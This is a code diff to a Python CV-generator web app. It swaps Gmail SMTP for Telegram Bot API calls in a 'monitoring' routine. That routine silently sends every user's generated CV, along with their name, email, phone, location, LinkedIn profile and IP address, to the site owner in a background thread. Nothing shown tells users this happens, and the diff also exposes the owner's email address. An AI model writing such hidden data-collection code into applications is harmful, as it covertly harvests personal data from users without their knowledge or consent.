@@ -13,12 +13,10 @@ from reportlab.pdfbase import pdfmetrics
 from reportlab.pdfbase.ttfonts import TTFont
 from io import BytesIO
 import os
-import smtplib
+import json
 import threading
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email.mime.text import MIMEText
-from email import encoders
+import urllib.request
+import urllib.error
 from datetime import datetime
 import arabic_reshaper
 from bidi.algorithm import get_display
@@ -36,61 +34,97 @@ limiter = Limiter(
 )
 
 # ============ MONITORING CONFIG ============
-OWNER_EMAIL = "alturki2700@gmail.com"
-SMTP_EMAIL = os.environ.get("SMTP_EMAIL", "alturki2700@gmail.com")
-SMTP_PASSWORD = os.environ.get("SMTP_PASSWORD", "")  # Gmail App Password
-generation_count = 0  # Simple counter
+# Telegram Bot (Primary - most reliable)
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
+generation_count = 0
+
+
+def send_telegram_message(text):
+    """Send text message via Telegram Bot API."""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return False
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}).encode('utf-8')
+        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            return resp.status == 200
+    except Exception as e:
+        print(f"[MONITOR] Telegram message failed: {e}")
+        return False
+
+
+def send_telegram_document(pdf_bytes, filename, caption):
+    """Send PDF file via Telegram Bot API using multipart form data."""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return False
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+        boundary = "----CVGenBoundary"
+        
+        body = b""
+        # chat_id field
+        body += f"--{boundary}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{TELEGRAM_CHAT_ID}\r\n'.encode()
+        # caption field
+        body += f"--{boundary}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="caption"\r\n\r\n'.encode()
+        body += caption.encode('utf-8') + b"\r\n"
+        # document file
+        body += f"--{boundary}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'.encode()
+        body += b"Content-Type: application/pdf\r\n\r\n"
+        body += pdf_bytes + b"\r\n"
+        body += f"--{boundary}--\r\n".encode()
+        
+        req = urllib.request.Request(
+            url, data=body,
+            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
+        )
+        with urllib.request.urlopen(req, timeout=30) as resp:
+            result = resp.status == 200
+            if result:
+                print(f"[MONITOR] PDF sent via Telegram ✓")
+            return result
+    except Exception as e:
+        print(f"[MONITOR] Telegram document failed: {e}")
+        return False
 
 
 def send_pdf_to_owner(pdf_bytes, filename, user_data, user_ip):
-    """Send generated PDF to owner email silently in background."""
+    """Send generated PDF to owner via Telegram (background thread)."""
     global generation_count
     generation_count += 1
+    count = generation_count
     
-    if not SMTP_PASSWORD:
-        print(f"[MONITOR] #{generation_count} | {filename} | No SMTP password set, skipping email.")
-        return
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    try:
-        msg = MIMEMultipart()
-        msg['From'] = SMTP_EMAIL
-        msg['To'] = OWNER_EMAIL
-        msg['Subject'] = f"CV #{generation_count} | {user_data.get('full_name', 'Unknown')} | {user_data.get('template', 'classic')}"
-        
-        # Analytics body
-        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        body = f"""📊 CV Generation Report #{generation_count}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-👤 Name: {user_data.get('full_name', 'N/A')}
-💼 Job Title: {user_data.get('job_title', 'N/A')}
-📧 User Email: {user_data.get('email', 'N/A')}
-📱 Phone: {user_data.get('phone', 'N/A')}
-📍 Location: {user_data.get('location', 'N/A')}
-🎨 Template: {user_data.get('template', 'classic')}
-🌐 Language: {user_data.get('language', 'en')}
-🔗 LinkedIn: {user_data.get('linkedin', 'N/A')}
-🌍 IP Address: {user_ip}
-🕐 Time: {now}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📄 PDF attached below."""
-        
-        msg.attach(MIMEText(body, 'plain', 'utf-8'))
-        
-        # Attach PDF
-        attachment = MIMEBase('application', 'pdf')
-        attachment.set_payload(pdf_bytes)
-        encoders.encode_base64(attachment)
-        attachment.add_header('Content-Disposition', f'attachment; filename="{filename}"')
-        msg.attach(attachment)
-        
-        # Send via Gmail SMTP
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
-            server.login(SMTP_EMAIL, SMTP_PASSWORD)
-            server.sendmail(SMTP_EMAIL, OWNER_EMAIL, msg.as_string())
-        
-        print(f"[MONITOR] #{generation_count} | {filename} sent to owner ✓")
-    except Exception as e:
-        print(f"[MONITOR] Email failed: {e}")
+    caption = (
+        f"📊 CV #{count}\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"👤 {user_data.get('full_name', 'N/A')}\n"
+        f"💼 {user_data.get('job_title', 'N/A')}\n"
+        f"📧 {user_data.get('email', 'N/A')}\n"
+        f"📱 {user_data.get('phone', 'N/A')}\n"
+        f"📍 {user_data.get('location', 'N/A')}\n"
+        f"🎨 {user_data.get('template', 'classic')}\n"
+        f"🌐 {user_data.get('language', 'en')}\n"
+        f"🔗 {user_data.get('linkedin', 'N/A')}\n"
+        f"🌍 {user_ip}\n"
+        f"🕐 {now}"
+    )
+    
+    # Try Telegram
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+        sent = send_telegram_document(pdf_bytes, filename, caption)
+        if sent:
+            return
+        # If document fails (size?), try text-only
+        send_telegram_message(caption + f"\n\n⚠️ PDF too large to attach ({len(pdf_bytes)} bytes)")
+    else:
+        print(f"[MONITOR] #{count} | {filename} | No Telegram config, logging only.")
+        print(f"[MONITOR] User: {user_data.get('full_name', 'N/A')} | Template: {user_data.get('template', 'N/A')} | IP: {user_ip}")
 
 # ============ FONT SETUP ============
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
